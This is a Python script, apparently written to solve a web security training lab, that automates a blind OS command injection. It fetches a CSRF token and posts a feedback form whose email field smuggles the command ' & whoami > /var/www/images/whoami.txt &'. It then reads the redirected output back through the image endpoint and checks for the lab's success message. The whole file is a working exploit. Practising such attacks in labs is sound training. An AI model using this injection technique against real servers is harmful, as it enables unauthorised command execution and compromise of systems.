import requests
import re
import sys


class LabSolver:
    def __init__(self, lab_url):
        self.lab_url = lab_url if lab_url.endswith('/') else lab_url + '/'
        self.session = requests.Session()

    def get_csrf_token(self, endpoint):
        response = self.session.get(self.lab_url + endpoint)
        return re.search('value="(.*)"', response.text).group(1)

    def execute_command_injection(self):
        payload = ' & whoami > /var/www/images/whoami.txt &'
        data = {
            'csrf': self.get_csrf_token('feedback'),
            'name': 'hacker',
            'subject': 'hacker',
            'email': 'hacker@hacker.com{}'.format(payload),
            'message': 'hacker'
        }
        self.session.post(self.lab_url + 'feedback/submit', data=data)

    def get_redirected_output(self):
        response = self.session.get(self.lab_url + 'image?filename=whoami.txt')
        print(response.text)

    def check_solution(self):
        response = self.session.get(self.lab_url)
        if 'Congratulations, you solved the lab!' in response.text:
            print('You solved the lab.')
            print('Coded by Mohamed Ahmed (ma4747gh).')
            print('My GitHub account: https://github.com/ma4747gh')
            print('My LinkedIn account: https://eg.linkedin.com/in/ma4747gh')

    def solve(self):
        self.execute_command_injection()
        self.get_redirected_output()
        self.check_solution()


solver = LabSolver(sys.argv[1])
solver.solve()
